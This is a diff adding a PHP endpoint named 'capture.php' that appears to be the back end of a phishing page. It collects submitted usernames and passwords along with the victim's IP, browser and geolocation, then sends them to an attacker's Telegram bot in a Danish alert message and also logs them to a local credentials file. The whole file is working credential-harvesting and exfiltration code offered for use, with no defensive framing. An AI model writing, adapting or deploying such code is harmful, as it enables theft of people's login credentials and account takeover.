@@ -1,0 +1,67 @@
+<?php
+// server/capture.php - Backup capture endpoint
+
+$botToken = "YOUR_BOT_TOKEN_HERE";
+$chatId = "YOUR_CHAT_ID_HERE";
+
+$username = $_POST['username'] ?? '';
+$password = $_POST['password'] ?? '';
+$ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
+$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
+$referrer = $_SERVER['HTTP_REFERER'] ?? 'Direct';
+$timestamp = date('Y-m-d H:i:s');
+
+// Geo lookup
+$location = "Unknown";
+try {
+    $geoData = @file_get_contents("http://ip-api.com/json/{$ip}");
+    if ($geoData) {
+        $geo = json_decode($geoData, true);
+        if ($geo && $geo['status'] === 'success') {
+            $location = "{$geo['city']}, {$geo['country']} ({$geo['isp']})";
+        }
+    }
+} catch (Exception $e) {}
+
+$message = "🔴 <b>NYT LOGIN FANGET (PHP)</b> 🔴\n";
+$message .= "━━━━━━━━━━━━━━━━━━━━━━\n";
+$message .= "📅 <b>Tid:</b> {$timestamp}\n";
+$message .= "🌐 <b>IP:</b> {$ip}\n";
+$message .= "📍 <b>Placering:</b> {$location}\n";
+$message .= "━━━━━━━━━━━━━━━━━━━━━━\n";
+$message .= "👤 <b>BRUGER-ID:</b> <code>{$username}</code>\n";
+$message .= "🔑 <b>ADGANGSKODE:</b> <code>{$password}</code>\n";
+$message .= "━━━━━━━━━━━━━━━━━━━━━━\n";
+$message .= "🖥 <b>Browser:</b> {$userAgent}\n";
+$message .= "🔗 <b>Henviser:</b> {$referrer}\n";
+
+function sendTelegram($botToken, $chatId, $message) {
+    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
+    $data = [
+        'chat_id' => $chatId,
+        'text' => $message,
+        'parse_mode' => 'HTML'
+    ];
+    
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    
+    $response = curl_exec($ch);
+    curl_close($ch);
+    
+    return $response;
+}
+
+$telegramResponse = sendTelegram($botToken, $chatId, $message);
+
+// Local log backup
+$logFile = __DIR__ . '/logs/credentials.txt';
+$logEntry = "{$timestamp} | User: {$username} | Pass: {$password} | IP: {$ip}\n";
+@file_put_contents($logFile, $logEntry, FILE_APPEND);
+
+header('Content-Type: application/json');
+echo json_encode(['success' => true]);
+?>
